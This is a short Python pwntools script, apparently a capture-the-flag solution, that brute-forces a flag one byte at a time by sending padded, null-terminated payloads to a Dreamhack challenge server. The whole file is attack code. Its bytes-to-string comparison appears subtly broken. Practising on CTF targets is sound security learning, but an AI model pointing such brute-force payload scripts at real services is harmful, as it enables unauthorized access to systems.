from pwn import *

flag = b''

#context.log_level = 'debug'

for i in reversed(range(63)) :
    print(f'flag : {flag}')
    print(i)
    found = False
    for j in range(0x0, 0x7f) :
        #p = process("./checkflag")
        p = remote("host3.dreamhack.games", 12662)
        #context.log_level = 'debug'

        payload = b'A'*i
        payload += bytes(chr(j),'ascii')
        payload += flag
        payload += b'\x00'
        #payload += f'{chr(brute)}\x00'.encode()
        payload += b'A'*(i)
        #payload = asm(payload)
        p.send(payload)
        if (p.recvline() == 'Correct!\n'):
            flag = bytes(chr(j), 'ascii') + flag
            found = True
            break
        p.close()
    if not found :
        flag = flag + b'\x00'
print(flag)
